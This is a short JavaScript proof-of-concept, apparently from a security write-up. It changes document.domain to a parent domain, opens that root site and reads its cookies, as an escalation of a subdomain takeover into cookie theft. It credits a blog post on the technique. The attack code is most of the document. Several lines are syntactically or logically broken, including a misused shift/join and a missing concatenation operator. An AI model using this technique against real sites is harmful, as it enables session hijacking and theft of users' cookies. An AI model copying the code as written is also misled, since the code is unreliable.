console.log("Initial: ",document.domain)

var root_domain=document.domain.split('.').shift().join('.')
console.log("Manipulated: ", root_domain)
document.domain=root_domain

var url= "https://" + root_domain "/"
var cookie = window.open(url).document.cookie;
console.log("Cookies:", cookie)

// Credits :) 
// http://blog.takemyhand.xyz/2019/05/escalating-subdomain-takeovers-to-steal.html
